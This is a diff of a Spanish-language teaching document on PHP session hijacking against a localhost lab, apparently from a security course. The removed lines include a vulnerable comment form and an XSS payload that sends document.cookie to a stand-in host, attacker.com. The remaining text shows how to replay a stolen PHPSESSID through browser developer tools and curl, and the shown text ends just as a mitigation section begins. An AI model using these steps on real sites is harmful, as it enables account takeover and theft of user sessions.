@@ -189,79 +189,63 @@ A continuación, se detalla cómo un atacante puede explotar este código vulner
 >
 >![](images/GIS10.png)
 >
->Ya el atacante tiene los datos de nuestra sesión.
+>Ya el atacante tiene los datos de nuestra sesión: `
 
->**Capturar la solicitud del usuario legítimo.**
->2
->3. Extraer la cookie PHPSESSID=ep5ae44cln6q76t8v18philqh3.
-![](images/GIS5.png)
+
 > **Ataque XSS (Cross-Site Scripting)**
-Si la aplicación tiene alguna vulnerabilidad XSS, el atacante puede inyectar un script para robar cookies. Primero
-creamos el fichero session_comment.php:
-<?php
-if (isset($_POST['comment'])) {
-echo "Comentario publicado: " . $_POST['comment'];
-}
-?>
-<form method="post">
-<input type="text" name="comment">
-<button type="submit">Enviar</button>
-</form>
-•
- Insertamos el siguiente script para obtener las cookies:
-<script>
-alert(document.cookie);
-</script>
-3
-•
- Cuando un usuario acceda a la página, su navegador enviará la cookie de sesión al servidor del atacante.
-<script>
-document.location='http://attacker.com/steal.php?cookie='+document.cookie;
-</script>
-Sniffing en redes WiFi públicas
-•
- Si la víctima usa una WiFi pública sin HTTPS, su cookie puede ser interceptada con herramientas como Firesheep
-o Ettercap.
-4
-3o El atacante usa la cookie robada
-Una vez que el atacante tiene la cookie de sesión (PHPSESSID=ep5ae44cln6q76t8v18philqh3), la puede utilizar para
-suplantar a la víctima.
-Editar cookies en el navegador
-1.
- Abrir las herramientas de desarrollador (F12 en Chrome).
-2.
- Ir a Application > Storage > Cookies.
-3.
- Seleccionar https://localhost
-4.
- Modificar PHPSESSID y reemplazarlo por el valor robado.
-Enviar el Session ID en una solicitud
-El atacante puede acceder directamente a la sesión de la víctima:
-https://localhost/session.php
+>Si la aplicación tiene alguna vulnerabilidad XSS, el atacante puede inyectar un script para robar cookies. 
+>
+> Puedes ver cómo obtener los datos de sesión mediante ataque XSS en la actividad correspondiente: <https://github.com/jmmedinac03vjp/PPS-Unidad3Actividad5-XSS>
+
+
+> **Sniffing en redes WiFi públicas**
+>
+> Si la víctima usa una WiFi pública sin HTTPS, su cookie puede ser interceptada con herramientas como Firesheep o Ettercap.
+>
+>![](images/GIS11.png)
+>
+
+**Como utilizar la cookie robada**
+Una vez que el atacante tiene la cookie de sesión (PHPSESSID=e6d541e8b64a3117ca7fbc56a4198b8c), la puede utilizar para suplantar a la víctima.
+
+1. Editar cookies en el navegador: Abrir las herramientas de desarrollador (F12 en Chrome).
+
+2. Ir a Application > Storage > Cookies.
+
+3. Seleccionar https://localhost
+
+![](images/GIS12.png)
+
+4. Modificar PHPSESSID y reemplazarlo por el valor robado.
+
+![](images/GIS13.png)
+
+5. Enviar el Session ID en una solicitud.
+
+![](images/GIS14.png)
+
+El atacante puede acceder directamente a la sesión de la víctima: http://localhost/session.php
+
 Añadiendo manualmente la cookie con cURL:
-curl -b "PHPSESSID=ep5ae44cln6q76t8v18philqh3" https://victima.com/session.php
-5
+
+~~~
+curl -b "PHPSESSID=e6d541e8b64a3117ca7fbc56a4198b8c" https://localhost/sesion.php
+~~~
+
+![](images/GIS15.png)
+
 4o Acceso a la cuenta de la víctima
+
 Ahora el atacante ya puede:
-•
-•
-•
-•
-Ver datos personales de la víctima.
-Realizar cambios en la cuenta (si hay opciones de perfil).
-Hacer compras o transacciones (si la web lo permite).
-Modificar la contraseña del usuario.
-Pasos realizados en el ejemplo real de la explotación:
-1.
-2.
-3.
-4.
-5.
-Usuario legítimo: https://localhost/session.php?user=admin
-Atacante captura PHPSESSID=ep5ae44cln6q76t8v18philqh3
-Atacante edita su cookie en el navegador y accede a https:/localhost/session.php
-Atacante ve: "Sesión iniciada como: admin"
-El atacante habría tomado el control de la sesión sin necesidad de credenciales
+
+- Ver datos personales de la víctima.
+
+- Realizar cambios en la cuenta (si hay opciones de perfil).
+-
+- Hacer compras o transacciones (si la web lo permite).
+
+- Modificar la contraseña del usuario.
+
 Mitigación de Session Hijacking
 Para evitar este ataque, se deben implementar varias medidas:
 * Regenerar el ID de sesión en cada inicio de sesión, además guarda en la sesión el valor recibido por GET['user'],
